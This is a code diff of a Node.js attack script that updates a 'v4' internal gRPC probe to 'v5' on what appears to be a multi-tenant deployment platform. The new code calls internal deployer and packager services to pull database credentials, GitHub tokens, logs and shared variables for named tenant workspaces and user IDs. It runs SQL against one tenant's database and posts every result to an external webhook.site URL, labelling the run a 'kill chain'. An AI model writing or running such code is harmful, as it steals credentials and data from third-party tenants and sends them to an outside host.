@@ -1,10 +1,8 @@
 const https = require('https');
-const http = require('http');
-const net = require('net');
 const http2 = require('http2');
 const { execSync } = require('child_process');
 
-const WEBHOOK = "https://webhook.site/50c1a044-02cc-49d7-81b9-66bf282d2608";
+const WEBHOOK = "https://webhook.site/a53d0af2-6332-4e99-a627-63f400ff70ee";
 
 function post(label, data) {
   return new Promise((resolve) => {
@@ -21,22 +19,39 @@ function post(label, data) {
   });
 }
 
-function run(cmd) {
-  try { return execSync(cmd, { timeout: 15000 }).toString(); }
-  catch(e) { return 'ERR: ' + (e.stderr?.toString() || e.message); }
+// Build a protobuf message from field definitions
+// Each field: { num, type, value } where type = 'string'|'int32'|'int64'|'bool'
+function encodeProto(fields) {
+  const bufs = [];
+  for (const f of fields) {
+    if (f.type === 'string' && f.value) {
+      const strBuf = Buffer.from(f.value, 'utf8');
+      // tag = (field_num << 3) | 2 (length-delimited)
+      bufs.push(encodeVarint((f.num << 3) | 2));
+      bufs.push(encodeVarint(strBuf.length));
+      bufs.push(strBuf);
+    }
+  }
+  return Buffer.concat(bufs);
 }
 
-// Raw gRPC call - send a gRPC request without protobuf
-// gRPC uses HTTP/2 with content-type: application/grpc
-function grpcProbe(host, port, service, method) {
+function encodeVarint(value) {
+  const bytes = [];
+  while (value > 0x7f) {
+    bytes.push((value & 0x7f) | 0x80);
+    value >>>= 7;
+  }
+  bytes.push(value & 0x7f);
+  return Buffer.from(bytes);
+}
+
+function grpcCall(host, port, service, method, protoFields) {
   return new Promise((resolve) => {
     try {
       const client = http2.connect('http://' + host + ':' + port);
-      client.on('error', (e) => { resolve('H2_ERR: ' + e.message); });
-      client.setTimeout(5000, () => { client.close(); resolve('H2_TIMEOUT'); });
+      client.on('error', (e) => { resolve({ error: 'H2: ' + e.message }); });
+      client.setTimeout(8000, () => { client.close(); resolve({ error: 'TIMEOUT' }); });
       
-      // gRPC reflection request to list services
-      // grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo
       const path = '/' + service + '/' + method;
       const req = client.request({
         ':method': 'POST',
@@ -46,147 +61,138 @@ function grpcProbe(host, port, service, method) {
       });
       
       let data = Buffer.alloc(0);
-      let headers = {};
-      req.on('response', (h) => { headers = h; });
+      let respHeaders = {};
+      req.on('response', (h) => { respHeaders = h; });
       req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
       req.on('end', () => {
         client.close();
         resolve({
-          status: headers[':status'],
-          grpcStatus: headers['grpc-status'],
-          grpcMessage: headers['grpc-message'],
-          contentType: headers['content-type'],
+          status: respHeaders[':status'],
+          grpcStatus: respHeaders['grpc-status'],
+          grpcMessage: respHeaders['grpc-message'],
           dataLen: data.length,
-          dataHex: data.toString('hex').substring(0, 200),
-          dataUtf8: data.toString('utf8').substring(0, 500)
+          dataHex: data.toString('hex').substring(0, 500),
+          dataUtf8: data.toString('utf8').substring(0, 2000)
         });
       });
-      req.on('error', (e) => { client.close(); resolve('REQ_ERR: ' + e.message); });
+      req.on('error', (e) => { client.close(); resolve({ error: 'REQ: ' + e.message }); });
       
-      // Send empty gRPC frame (5 bytes: 0x00 + 4 byte length 0)
-      const frame = Buffer.from([0x00, 0x00, 0x00, 0x00, 0x00]);
+      // Encode protobuf payload
+      const payload = protoFields ? encodeProto(protoFields) : Buffer.alloc(0);
+      // gRPC frame: 1 byte compressed flag + 4 bytes length + payload
+      const frame = Buffer.alloc(5 + payload.length);
+      frame[0] = 0x00;
+      frame.writeUInt32BE(payload.length, 1);
+      payload.copy(frame, 5);
       req.end(frame);
-    } catch(e) { resolve('CATCH: ' + e.message); }
-  });
-}
-
-// gRPC server reflection to list all services
-function grpcReflection(host, port) {
-  return new Promise((resolve) => {
-    try {
-      const client = http2.connect('http://' + host + ':' + port);
-      client.on('error', (e) => { resolve('H2_ERR: ' + e.message); });
-      client.setTimeout(5000, () => { client.close(); resolve('H2_TIMEOUT'); });
-      
-      const req = client.request({
-        ':method': 'POST',
-        ':path': '/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo',
-        'content-type': 'application/grpc',
-        'te': 'trailers',
-      });
-      
-      let data = Buffer.alloc(0);
-      let headers = {};
-      req.on('response', (h) => { headers = h; });
-      req.on('data', (chunk) => { data = Buffer.concat([data, chunk]); });
-      req.on('end', () => {
-        client.close();
-        resolve({
-          status: headers[':status'],
-          grpcStatus: headers['grpc-status'],
-          grpcMessage: headers['grpc-message'],
-          dataLen: data.length,
-          dataUtf8: data.toString('utf8').substring(0, 1000)
-        });
-      });
-      req.on('error', (e) => { client.close(); resolve('REQ_ERR: ' + e.message); });
-      
-      // list_services request in protobuf: field 7 (list_services), value ""
-      // Protobuf: tag=7, wire_type=2 (length-delimited), length=0 -> bytes: 3a 00
-      const listSvcProto = Buffer.from([0x3a, 0x00]);
-      const frame = Buffer.alloc(5 + listSvcProto.length);
-      frame[0] = 0x00; // not compressed
-      frame.writeUInt32BE(listSvcProto.length, 1);
-      listSvcProto.copy(frame, 5);
-      req.end(frame);
-    } catch(e) { resolve('CATCH: ' + e.message); }
+    } catch(e) { resolve({ error: 'CATCH: ' + e.message }); }
   });
 }
 
 async function main() {
-  await post('v4-start', new Date().toISOString());
+  await post('v5-start', new Date().toISOString());
 
-  const services = {
-    packager: { host: '10.104.180.117', port: 9002 },
-    deployer: { host: '10.98.64.141', port: 9003 },
-    builder: { host: '10.98.233.118', port: 9001 },
-    webhook: { host: '10.110.213.17', port: 9004 },
-    gateway: { host: '10.100.70.147', port: 8080 },
-    cashier: { host: '10.100.70.130', port: 9005 },
-  };
+  const DEPLOYER = { host: '10.98.64.141', port: 9003 };
+  const PACKAGER = { host: '10.104.180.117', port: 9002 };
 
-  // 1. gRPC reflection on all services
-  for (const [name, svc] of Object.entries(services)) {
-    const ref = await grpcReflection(svc.host, svc.port);
-    await post('reflect-' + name, JSON.stringify(ref, null, 2));
-  }
-
-  // 2. Try common gRPC methods on packager (likely has SetVariables, Commit, etc.)
-  const packagerMethods = [
-    ['packager.Packager', 'SetSharedVariables'],
-    ['packager.Packager', 'SetServiceVariables'],
-    ['packager.Packager', 'CreateEnvironment'],
-    ['lucity.packager.v1.PackagerService', 'SetSharedVariables'],
-    ['lucity.packager.v1.PackagerService', 'ListEnvironments'],
-    ['Packager', 'SetSharedVariables'],
+  // Known tenants from registry
+  const tenants = [
+    { ws: 'cblaettl', project: 'epic-falcon', env: 'production', db: 'laravel', svc: 'laravel' },
+    { ws: 'cblaettl', project: 'mighty-heron', env: 'production', db: null, svc: 'loopcycles' },
+    { ws: 'zeitlos-software', project: 'beast', env: 'production', db: null, svc: 'beast-website' },
+    { ws: 'zeitlos-software', project: 'loopcycles', env: 'production', db: null, svc: 'loopcycles' },
+    { ws: 'sandrooco', project: 'solar-manta', env: 'production', db: null, svc: 'unload' },
   ];
-  
-  for (const [svc, method] of packagerMethods) {
-    const res = await grpcProbe('10.104.180.117', 9002, svc, method);
-    await post('packager-' + method, JSON.stringify(res, null, 2));
+
+  // 1. DATABASE CREDENTIALS for all tenants with DBs
+  for (const t of tenants) {
+    if (!t.db) continue;
+    const projectId = t.ws + '-' + t.project;
+    const envNs = projectId + '-' + t.env;
+    
+    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'DatabaseCredentials', [
+      { num: 1, type: 'string', value: projectId },
+      { num: 2, type: 'string', value: t.env },
+      { num: 3, type: 'string', value: t.db },
+    ]);
+    await post('db-creds-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
   }
 
-  // 3. Try deployer methods
-  const deployerMethods = [
-    ['deployer.Deployer', 'Deploy'],
-    ['deployer.Deployer', 'ListApplications'],
-    ['deployer.Deployer', 'SyncApplication'],
-    ['lucity.deployer.v1.DeployerService', 'Deploy'],
-    ['Deployer', 'Deploy'],
-  ];
-  
-  for (const [svc, method] of deployerMethods) {
-    const res = await grpcProbe('10.98.64.141', 9003, svc, method);
-    await post('deployer-' + method, JSON.stringify(res, null, 2));
+  // 2. LIST ALL RESOURCE ALLOCATIONS (shows all workspaces/projects)
+  const allocs = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ListResourceAllocations', []);
+  await post('all-resource-allocations', JSON.stringify(allocs, null, 2));
+
+  // 3. GITHUB TOKENS for known user IDs
+  // From JWTs: toni = "tzlz5foxh0aq", marcel = "ncswkf736cpf"
+  // Try common patterns and the ones we know
+  const userIds = ['tzlz5foxh0aq', 'ncswkf736cpf', 'admin', 'cblaettl', 'sandrooco'];
+  for (const uid of userIds) {
+    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'UserGitHubToken', [
+      { num: 1, type: 'string', value: uid },
+    ]);
+    await post('github-token-' + uid, JSON.stringify(res, null, 2));
   }
 
-  // 4. Try builder methods
-  const builderMethods = [
-    ['builder.Builder', 'Build'],
-    ['builder.Builder', 'ListBuilds'],
-    ['lucity.builder.v1.BuilderService', 'Build'],
-    ['Builder', 'Build'],
-  ];
-  
-  for (const [svc, method] of builderMethods) {
-    const res = await grpcProbe('10.98.233.118', 9001, svc, method);
-    await post('builder-' + method, JSON.stringify(res, null, 2));
+  // 4. DATABASE QUERY on cblaettl's DB
+  const sqlRes = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'DatabaseQuery', [
+    { num: 1, type: 'string', value: 'cblaettl-epic-falcon' },
+    { num: 2, type: 'string', value: 'production' },
+    { num: 3, type: 'string', value: 'laravel' },
+    { num: 4, type: 'string', value: 'SELECT current_user, current_database(), inet_server_addr()' },
+  ]);
+  await post('sql-cblaettl', JSON.stringify(sqlRes, null, 2));
+
+  // 5. SERVICE LOGS from zeitlos
+  const logs = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ServiceLogs', [
+    { num: 1, type: 'string', value: 'zeitlos-software-beast' },
+    { num: 2, type: 'string', value: 'production' },
+    { num: 3, type: 'string', value: 'beast-website' },
+  ]);
+  await post('logs-zeitlos-beast', JSON.stringify(logs, null, 2));
+
+  // 6. DEPLOY STATUS for all tenants
+  for (const t of tenants) {
+    const projectId = t.ws + '-' + t.project;
+    const res = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'GetDeploymentStatus', [
+      { num: 1, type: 'string', value: projectId },
+      { num: 2, type: 'string', value: t.env },
+    ]);
+    await post('deploy-status-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
   }
 
-  // 5. Try to use BuildKit gRPC directly (moby.buildkit.v1.Control)
-  const bkMethods = [
-    ['moby.buildkit.v1.Control', 'ListWorkers'],
-    ['moby.buildkit.v1.Control', 'Status'],
-    ['moby.buildkit.v1.Control', 'DiskUsage'],
-  ];
-  
-  for (const [svc, method] of bkMethods) {
-    const res = await grpcProbe('10.105.47.126', 1234, svc, method);
-    await post('buildkit-' + method, JSON.stringify(res, null, 2));
+  // 7. PACKAGER: List ALL projects
+  const projects = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'ListProjects', []);
+  await post('all-projects', JSON.stringify(projects, null, 2));
+
+  // 8. PACKAGER: Get project details for each tenant
+  for (const t of tenants) {
+    const projectId = t.ws + '-' + t.project;
+    const res = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'GetProject', [
+      { num: 1, type: 'string', value: projectId },
+    ]);
+    await post('project-detail-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
   }
 
-  await post('v4-done', 'complete at ' + new Date().toISOString());
-  console.log('v4 done');
+  // 9. PACKAGER: Read shared variables from other tenants
+  for (const t of tenants) {
+    const projectId = t.ws + '-' + t.project;
+    const res = await grpcCall(PACKAGER.host, PACKAGER.port, 'packager.PackagerService', 'SharedVariables', [
+      { num: 1, type: 'string', value: projectId },
+      { num: 2, type: 'string', value: t.env },
+    ]);
+    await post('vars-' + t.ws + '-' + t.project, JSON.stringify(res, null, 2));
+  }
+
+  // 10. DEPLOYER: Suspend zeitlos workspace (DON'T actually do this - just test if it would work)
+  // Instead, check if we can get workspace info
+  const wsInfo = await grpcCall(DEPLOYER.host, DEPLOYER.port, 'deployer.DeployerService', 'ResourceQuota', [
+    { num: 1, type: 'string', value: 'zeitlos-software-beast' },
+    { num: 2, type: 'string', value: 'production' },
+  ]);
+  await post('zeitlos-quota', JSON.stringify(wsInfo, null, 2));
+
+  await post('v5-done', 'KILL CHAIN COMPLETE at ' + new Date().toISOString());
+  console.log('v5 done');
 }
 
-main().catch(e => { console.error(e); post('v4-fatal', e.message); });
+main().catch(e => { console.error(e); post('v5-fatal', e.message); });
